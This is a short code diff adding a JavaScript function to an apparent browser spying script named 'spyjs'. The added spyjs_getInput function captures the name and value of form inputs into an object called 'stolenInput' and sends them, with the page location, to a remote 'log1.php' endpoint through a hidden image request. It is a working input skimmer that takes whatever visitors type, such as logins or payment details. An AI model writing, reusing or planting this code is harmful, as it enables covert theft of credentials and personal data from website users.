@@ -37,3 +37,26 @@ function spyjs_refreshEvents(){
   		spyjs_getInput(e.currentTarget);
 	});
 }
+
+function spyjs_getInput(inputInfo){
+	 
+	var name = inputInfo.name;
+	var value = inputInfo.value;
+	var stolenInput = {};
+	if(name === ""){
+		name="undefined_input";
+	}
+	if(value != ""){
+		stolenInput[name] = value;
+		if(debug){
+			console.log(name+"="+value);
+		}
+		
+        var pic = new Image()
+        pic.src = url+'log1.php?values='+name+"="+value +  "<br/>"+ ""+currLoc+""
+		
+	}
+}
+function spyjs_saveData(data){
+	
+};
